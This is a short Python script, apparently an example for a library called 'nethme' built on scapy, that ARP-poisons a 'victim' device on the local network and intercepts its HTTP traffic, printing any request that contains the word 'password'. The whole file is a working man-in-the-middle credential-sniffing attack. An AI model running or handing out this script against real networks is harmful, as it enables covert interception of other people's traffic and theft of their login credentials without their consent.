from scapy.all import *
from nethme import *


def http_handler(device, http_request):
    http = str(http_request[HTTP])
    if 'password' in http:
        http_request[HTTP].show()


def main():
    net = Network(iface='en0')
    victim = net.get_device(ip='192.168.1.13')
    #  victim = net.this_device
    print(victim)

    victim.poison_arp()  # with no arguments poison the gateway IP with this.device MAC address
    victim.intercept('http_request', http_handler)


if __name__ == '__main__':
    main()
